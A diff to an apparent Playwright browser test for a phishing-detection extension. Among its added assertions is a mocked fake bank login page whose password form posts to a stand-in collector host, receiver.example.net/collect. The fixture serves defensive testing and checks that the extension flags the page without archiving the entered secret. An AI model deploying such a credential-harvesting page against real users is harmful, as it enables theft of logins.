@@ -38,6 +38,19 @@ with TemporaryDirectory(prefix='hs-dom-download-') as profile,sync_playwright() 
         assert result['ok'],result
         return result['analysis']
     a=analyze();dom=a['dom_features']
+    assert not any(key in a for key in ['score','url_score','dom_score'])
+    assert 'probability_phishing' not in a['model_result']
+    assert sorted(rule['id'] for rule in a['correlation_rules'])==[f'R{i:02d}' for i in range(1,20)]
+    assert all(rule['status'] in ['matched','not_matched','undetermined'] for rule in a['correlation_rules'])
+    assert all('verdict' not in rule for rule in a['correlation_rules'])
+    stored=worker.evaluate('async()=>chrome.storage.local.get(["analysisByTab","featureArchive","urlHistory"])')
+    def assert_no_scores(value):
+        if isinstance(value,dict):
+            assert not {'score','url_score','dom_score','probability_phishing','raw_probability_phishing'}.intersection(value),value.keys()
+            for item in value.values():assert_no_scores(item)
+        elif isinstance(value,list):
+            for item in value:assert_no_scores(item)
+    assert_no_scores(stored)
     assert a['url_features']['url_file_extension'] is None,a['url_features']
     assert 'has_executable_download_link' not in dom
     assert dom['has_download_link'] is True and dom['download_file_extensions']==['exe'],dom
@@ -60,13 +73,24 @@ with TemporaryDirectory(prefix='hs-dom-download-') as profile,sync_playwright() 
     assert len(direct['feature_vector']['vector'])==20
     assert direct['dom_features']['has_download_link'] is False
     assert direct['decision_policy']['source']=='brand_executable_download_phishing'
+    url='https://bca.bank.com/login'
+    context.route(url,lambda route:route.fulfill(status=200,content_type='text/html',body='<html><head><title>Login BCA</title></head><body><h1>Masuk BCA</h1><form action="https://receiver.example.net/collect" method="post"><input name="password" type="password"><button>Login</button></form></body></html>'))
+    page.goto(url)
+    page.locator('input').fill('HS_BROWSER_SECRET_NOT_ARCHIVED')
+    login=analyze()
+    assert login['brand_features']['brand_domain_mismatch'] is True
+    assert login['dom_features']['forms'][0]['destination_verification'] is False
+    assert all(next(r['status'] for r in login['correlation_rules'] if r['id']==id)=='matched' for id in ['R03','R04'])
+    assert 'HS_BROWSER_SECRET_NOT_ARCHIVED' not in json.dumps(login)
     report={'passed':True,'version':worker.evaluate('()=>chrome.runtime.getManifest().version'),
         'download_link_read':True,'executable_link_read':True,'cross_site_read':True,
         'R13_verdict':a['verdict'],'R13_source':a['decision_policy']['source'],
         'pdf_not_executable':True,'removed_link_detected':True,'dynamic_link_detected':True,
         'url_suffix_read':True,'model_vector_still_20':True,
+        'confirmed_brand_mismatch_read':True,'form_destination_verification_read':True,
+        'R03_R04_live_wiring':True,'credential_values_not_archived':True,
         'separate_warning_removed':True,'downloads_permission_removed':True,
         'downloads_started':0,'public_sites_opened':0,'test':'local mocked page/API in Chromium'}
-    out=extension.parents[1]/'reports/dom_download_final_20261108';out.mkdir(exist_ok=True,parents=True)
+    out=extension.parents[1]/'reports/final_audit_20261109';out.mkdir(exist_ok=True,parents=True)
     (out/'browser_test.json').write_text(json.dumps(report,indent=2),encoding='utf-8');print(json.dumps(report,indent=2))
     context.close()
